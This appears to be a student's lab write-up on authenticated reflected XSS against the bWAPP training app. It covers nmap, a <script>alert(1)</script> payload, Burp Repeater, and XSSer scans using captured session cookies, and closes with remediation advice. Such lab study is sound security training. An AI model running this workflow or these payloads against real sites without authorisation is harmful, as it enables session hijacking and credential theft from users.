## What is this lab about?
A hands-on lab demonstrating **authenticated reflected XSS** on bWAPP. Covers manual XSS payload injection, Burp Suite Repeater verification, and automated scanning with **XSSer using session cookies** to access protected pages behind login.

---

## Key Concepts Explained

**Authenticated XSS**
- Vulnerability exists behind login wall — requires valid session.
- Attacker needs victim's session cookie or victim must be logged in when clicking malicious link.
- More dangerous than unauthenticated XSS — targets authenticated users with higher privileges.

**Session Cookie in XSSer**
- `--cookie` flag passes PHPSESSID to maintain authenticated session.
- Without cookie, XSSer gets redirected to login page — can't reach vulnerable endpoint.

**URL Encoding**
- `<` = `%3C`, `>` = `%3E`, `/` = `%2F`
- Browser automatically encodes special characters in URLs.

## Commands & Workflow

### Step 1 — Environment Setup
```bash
# Check Kali IP and identify target
ip addr show
nmap -sV 192.168.177.129
# Result: Port 80 (HTTP), Port 3306 (MySQL) — bWAPP
```

### Step 2 — Login to bWAPP
```bash
# Browser: http://192.168.177.129
# Credentials: bee / bug
# Login successful → PHPSESSID cookie set
```

### Step 3 — Identify Vulnerable Page
```bash
# Navigate: bWAPP → HTML Injection → Reflected (GET)
# URL: http://192.168.177.129/htmli_get.php
# Input field: "First name / Last name"

# Test input: "Joe Schmoe"
# Result: "Welcome Joe Schmoe" displayed on page
# Input reflected in HTML without sanitization → XSS possible
```

### Step 4 — Manual XSS Test
```bash
# Input in browser: <script>alert(1)</script>
# Result: Alert box pops up with "1" → XSS confirmed!

# Check page source:
# <div>Welcome <script>alert(1)</script></div>
# Script tags interpreted by browser
```

### Step 5 — Burp Suite Verification
```bash
# 1. Enable Burp proxy, FoxyProxy ON
# 2. Submit form with "Joe Schmoe"
# 3. Burp intercepts GET request:

GET /htmli_get.php?firstname=Joe&lastname=Schmoe&form=submit HTTP/1.1
Host: 192.168.177.129
Cookie: PHPSESSID=mpi6...; security_level=0
```

### Step 6 — Repeater Test
```bash
# Send to Repeater
# Replace "Joe" with payload: <script>alert(1)</script>
# Send → Response contains unescaped script tags
# Browser renders → Alert(1) executes
```

### Step 7 — XSSer with Authentication
```bash
# Capture cookie from Burp (PHPSESSID + security_level)
# Run XSSer with --cookie:

xsser --url "http://192.168.177.129/htmli_get.php" \
      --payload "firstname=XSS&lastname=Schmoe&form=submit" \
      --cookie "PHPSESSID=mpi6...; security_level=0" \
      --auto

# Result: Vulnerable confirmed
# XSSer injects payloads into 'firstname' parameter
```

### Step 8 — Custom Payload with XSSer
```bash
# Test specific payload:
xsser --url "http://192.168.177.129/htmli_get.php" \
      --payload "firstname=XSS&lastname=Schmoe&form=submit" \
      --cookie "PHPSESSID=mpi6...; security_level=0" \
      --Fp "<script>alert(1)</script>"

# Result: URL-encoded payload provided
# http://192.168.177.129/htmli_get.php?firstname=%3Cscript%3Ealert(1)%3C%2Fscript%3E...
```

### Step 9 — Browser Verification
```bash
# Copy XSSer output URL (with encoded payload)
# Paste in browser (FoxyProxy OFF)
# Result: Alert(1) pops up
# Page still shows "Welcome Schmoe" — payload executed + normal content preserved
```

## URL Encoding Reference

| Character | Encoding | Meaning |
|---|---|---|
| `<` | `%3C` | Less than (tag open) |
| `>` | `%3E` | Greater than (tag close) |
| `/` | `%2F` | Forward slash |
| ` ` | `+` or `%20` | Space |

## Key Takeaways

| Aspect | Detail |
|---|---|
| **Authentication required** | Cookie needed to access vulnerable page |
| **Parameter** | `firstname` — reflected without sanitization |
| **Payload** | `<script>alert(1)</script>` |
| **Type** | Reflected XSS (First Order) |
| **Impact** | Session hijacking, credential theft, defacement |

- **Authenticated XSS is more dangerous** — victim already logged in = higher value target.
- **Cookie is essential** — XSSer without `--cookie` can't reach protected pages.
- **URL encoding** — browser handles automatically, but understand `%3C` = `<` for manual testing.
- **Page source inspection** — confirms payload is interpreted, not just displayed as text.
- **Proof of Concept** — `alert(1)` is basic; real attacks use `document.cookie` theft, keyloggers, BeEF framework.
- **Remediation**: Input validation, output encoding (HTML entities), CSP headers.
